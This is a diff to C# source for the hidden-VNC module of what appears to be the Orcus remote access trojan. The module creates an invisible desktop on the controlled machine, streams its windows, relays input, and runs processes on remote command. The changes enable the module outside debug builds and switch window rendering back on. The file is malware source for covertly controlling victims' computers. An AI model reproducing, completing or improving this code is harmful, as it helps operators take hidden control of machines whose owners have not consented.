@@ -1,5 +1,4 @@
-﻿#if DEBUG
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
@@ -33,6 +32,7 @@ namespace Orcus.Commands.HVNC
                 DisposeSession();
         }
 
+
         private void DisposeSession()
         {
             try
@@ -62,13 +62,13 @@ namespace Orcus.Commands.HVNC
 
         public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
         {
-            switch ((HvncCommunication) parameter[0])
+            switch ((HvncCommunication)parameter[0])
             {
                 case HvncCommunication.CreateDesktop:
                     lock (_desktopLock)
                     {
                         var information =
-                            new Serializer(typeof (CreateDesktopInformation)).Deserialize<CreateDesktopInformation>(
+                            new Serializer(typeof(CreateDesktopInformation)).Deserialize<CreateDesktopInformation>(
                                 parameter, 1);
 
                         _currentDesktop = new Desktop();
@@ -99,14 +99,14 @@ namespace Orcus.Commands.HVNC
                             DisposeSession();
                         }
                     }
-                    ResponseByte((byte) HvncCommunication.ResponseDesktopClosed, connectionInfo);
+                    ResponseByte((byte)HvncCommunication.ResponseDesktopClosed, connectionInfo);
                     break;
                 case HvncCommunication.GetUpdate:
                     lock (_currentDesktop)
                     {
                         if (_currentDesktop == null || !_currentDesktop.IsOpen)
                         {
-                            ResponseByte((byte) HvncCommunication.ResponseUpdateFailed, connectionInfo);
+                            ResponseByte((byte)HvncCommunication.ResponseUpdateFailed, connectionInfo);
                             return;
                         }
 
@@ -170,15 +170,14 @@ namespace Orcus.Commands.HVNC
                             var windowToRenderHandle = BitConverter.ToInt32(parameter, 1);
                             if (windowToRenderHandle != 0)
                             {
-                                var renderWindow =
-                                    _renderWindows.FirstOrDefault(x => x.WindowInformation.Handle == windowToRenderHandle);
+                                var renderWindow = _renderWindows.FirstOrDefault(x => x.WindowInformation.Handle == windowToRenderHandle);
 
                                 if (renderWindow != null)
                                 {
                                     try
                                     {
                                         Debug.Print("Render window: " + windowToRenderHandle);
-                                        //windowResult.RenderedWindow = renderWindow.Render();
+                                        windowResult.RenderedWindow = renderWindow.Render().ToArray();
                                         if (windowResult.RenderedWindow == null)
                                         {
                                             Debug.Print("Render failed");
@@ -192,37 +191,36 @@ namespace Orcus.Commands.HVNC
                                 }
                             }
 
-                            ResponseBytes((byte) HvncCommunication.ResponseUpdate,
+                            ResponseBytes((byte)HvncCommunication.ResponseUpdate,
                                 new Serializer(typeof(WindowUpdate)).Serialize(windowResult), connectionInfo);
                         }
                         catch (Exception)
                         {
 #if DEBUG
                             throw;
-#else
-                            ResponseByte((byte) HvncCommunication.ResponseUpdateFailed, connectionInfo);
 #endif
+                            ResponseByte((byte)HvncCommunication.ResponseUpdateFailed, connectionInfo);
                         }
                     }
                     break;
                 case HvncCommunication.DoAction:
                     lock (_desktopLock)
                     {
-                        Debug.Print("Begin DoAction");
+                        //Debug.Print("Begin DoAction");
                         DoAction((HvncAction)parameter[1], parameter.Skip(2).ToArray());
-                        Debug.Print("End DoAction");
+                        //Debug.Print("End DoAction");
                     }
                     break;
                 case HvncCommunication.ExecuteProcess:
                     lock (_desktopLock)
                     {
-                        Debug.Print("Begin ExecuteProcess");
+                        //Debug.Print("Begin ExecuteProcess");
                         _currentDesktop.CreateProcess(Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1), "");
-                        Debug.Print("End ExecuteProcess");
+                        //Debug.Print("End ExecuteProcess");
                     }
 
                     connectionInfo.CommandResponse(this,
-                        new[] {(byte) HvncCommunication.ResponseProcessExecuted});
+                        new[] { (byte)HvncCommunication.ResponseProcessExecuted });
                     break;
                 default:
                     throw new ArgumentOutOfRangeException();
@@ -275,4 +273,3 @@ namespace Orcus.Commands.HVNC
         }
     }
 }
-#endif
